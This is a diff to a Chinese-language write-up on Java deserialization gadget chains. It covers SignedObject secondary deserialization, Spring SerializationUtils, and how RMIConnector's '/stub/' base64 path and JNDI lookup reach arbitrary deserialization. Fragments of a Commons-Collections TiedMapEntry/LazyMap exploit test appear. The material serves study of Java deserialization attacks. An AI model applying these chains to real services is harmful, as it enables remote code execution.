@@ -74,7 +74,7 @@ Java题就变成一道类的排列组合题了🤯，拼出一条可以打通的
 
 `java.security.SignedObject#getObject`
 
-这个类在`Hessian`反序列化中用过，由于`Hessian`反序列化的特殊性，不会执行类的`readObject`来反序列化，而是通过反射获取field再填充进一个空的实例化对象，导致`TemplatesImpl`不能利用。
+这个类在`Hessian`反序列化中用过，由于`Hessian`反序列化的特殊性，不会执行类的`readObject`来反序列化，而是通过反射获取field再填充进一个空的实例化对象，`_tfactory`又是`transient`修饰，`writeObject`不会写进去，导致`TemplatesImpl`不能利用。
 
 ```java
 public final class SignedObject implements Serializable {
@@ -126,9 +126,16 @@ SignedObject signedObject = new SignedObject(object_with_evil_readObject, privat
 
 `org.springframework.util.SerializationUtils.deserialize`
 
-
-
-
+```java
+public static Object deserialize(@Nullable byte[] bytes) {
+    if (bytes == null) {
+        return null;
+    }
+    try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
+        return ois.readObject();
+    } //...
+}
+```
 
 # RMIConnector
 
@@ -156,7 +163,7 @@ private RMIServer findRMIServerJRMP(String base64, Map<String, ?> env, boolean i
 }
 ```
 
-若能控制base64参数的内容就可以使用`ObjectInputStream`的`resolveClass`来加载对应的类
+若能控制base64参数的内容就可以任意反序列化。
 
 往上回溯
 
@@ -188,7 +195,9 @@ private RMIServer findRMIServer(JMXServiceURL directoryURL,
 }
 ```
 
-`path`以`/stub/`开头就能进到`findRMIServerJRMP`
+`path`以`/stub/`开头就能进到`findRMIServerJRMP`，`path`中`/stub/`为序列化字节的base64编码
+
+`path`由`directoryURL#getURLPath`得到
 
 在往上发现`connect`和`doStart`调用了`findRMIServer`
 
@@ -210,12 +219,9 @@ public synchronized void connect(Map<String,?> environment) {
     }
 
     try {
-        if (tracing) logger.trace("connect",idstr + " connecting...");
-
         final Map<String, Object> usemap =
             new HashMap<String, Object>((this.env==null) ?
                                         Collections.<String, Object>emptyMap() : this.env);
-
 
         if (environment != null) {
             EnvHelp.checkAttributes(environment);
@@ -321,7 +327,6 @@ public class RMIConnectorTest {
         TiedMapEntry entry = new TiedMapEntry(lazyMap, "test");
 
         Map expMap = new HashMap();
-        // put的时候也会执行hashCode，为了防止本地调试触发payload，这里放入假的payload
         expMap.put(entry, "xxx");
         lazyMap.remove("test");
 
@@ -348,12 +353,9 @@ public class RMIConnectorTest {
 private RMIServer findRMIServerJNDI(String jndiURL, Map<String, ?> env,
                                     boolean isIiop)
     throws NamingException {
-
     InitialContext ctx = new InitialContext(EnvHelp.mapToHashtable(env));
-
     Object objref = ctx.lookup(jndiURL);
     ctx.close();
-
     // ....
 }
 ```
